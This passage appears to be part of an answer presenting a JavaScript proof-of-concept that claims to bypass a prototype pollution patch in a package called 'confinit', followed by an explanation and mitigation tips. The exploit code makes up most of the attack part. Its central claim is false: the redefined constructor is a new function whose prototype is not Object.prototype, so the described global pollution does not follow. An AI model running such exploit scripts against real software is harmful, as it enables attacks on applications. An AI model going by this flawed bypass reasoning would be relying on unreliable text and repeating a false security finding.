const confinit = require('confinit');

async function exploit() {
  // The patch attempts to mitigate prototype pollution by adding hasOwnProperty
  // checks in setProp/getProp. However, this only blocks traversal/assignment for
  // keys that are NOT already existing own properties. Attackers can bypass this
  // by pre-initializing the malicious path on the target object or its prototypes.

  const configuration = {};

  // 1. Force 'constructor' to be an OWN property pointing to a function.
  // Plain objects inherit constructor; hasOwnProperty fails there, blocking traversal.
  // Functions, however, have an own 'prototype' property, allowing the chain to continue.
  Object.defineProperty(configuration, 'constructor', { value: function() {} });

  // 2. Pre-initialize the target polluted property on the prototype chain.
  // The patched setProp checks if the TARGET key exists as an own property before assigning.
  // By default, Object.prototype doesn't have 'exploited', so assignment would throw.
  configuration.constructor.prototype.exploited = 0; 

  // 3. Execute the malicious path. Since all intermediate and leaf keys now exist
  // as own properties, the hasOwnProperty checks pass, allowing overwrites.
  console.log("[*] Triggering setDeepProperty with bypassed path...");
  await confinit.setDeepProperty(configuration, 'constructor.prototype.exploited', 'yes');

  // 4. Verify prototype pollution
  const isPolluted = 'exploited' in Object.prototype;
  console.log("[*] Object.prototype has 'exploited'?", isPolluted);

  if (isPolluted) {
    console.log("[!] Vulnerability confirmed: Prototype successfully polluted.");
  } else {
    throw new Error("Exploit failed to pollute prototype chain.");
  }
}

await exploit();
```

### Explanation of the Vulnerability Demonstration

1. **Flawed Mitigation Logic**: The patch in `confinit` relies exclusively on `obj.hasOwnProperty(property)` inside `setProp` and `getProp`. This creates a critical blind spot: it only prevents operations on *non-existent* keys. It does not validate the *origin* or *safety* of existing keys.
2. **Bypass Mechanism**: By using `Object.defineProperty`, we forcefully make `constructor` an own property of `{}`, allowing traversal into `configuration.constructor`. The target is a function object, which natively possesses an own `prototype` property, satisfying the next `hasOwnProperty` check.
3. **Overwriting Bypass**: The final leaf assignment (`exploited`) typically throws because plain objects lack this key. By pre-initializing `configuration.constructor.prototype.exploited = 0`, we satisfy the existence check, allowing `setDeepProperty` to blindly overwrite it with `'yes'`. Since `configuration.constructor.prototype` points directly to `Object.prototype`, global prototype pollution is achieved.
4. **Security Implication**: This proves that checking key *existence* via `hasOwnProperty` is insufficient for sanitization against prototype pollution. Safe implementations must either:
   - Explicitly block or strip dangerous keys (`__proto__`, `constructor`, `prototype`) before traversal.
   - Use `Object.defineProperty` or `Object.assign` safely only after confirming keys are safe.
   - Validate configuration sources against a strict allow-list rather than relying on runtime property checks.

